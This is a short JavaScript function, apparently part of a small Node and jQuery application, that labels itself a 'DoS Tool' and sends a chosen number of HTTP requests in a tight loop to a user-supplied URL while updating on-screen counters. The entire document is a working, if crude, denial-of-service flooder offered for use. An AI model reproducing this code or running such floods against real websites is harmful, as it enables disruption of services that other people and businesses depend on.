function fundos(curlurl,times) {
	var request = require('request');
	
	$(".dosurl").html(curlurl);
	
	$(".status").html('The DoS Tool is start to DoS "'+curlurl+'"');
	
	for(i=0;i<times;i++){
		$(".dosn").html(i);
		$(".dosa").html(times);
		request({uri:curlurl}, function (error, response, body) {});
		console.log(i+"/"+times);
		if (i == times-1) {
			$(".status").html('Finished!');
		}
	}
}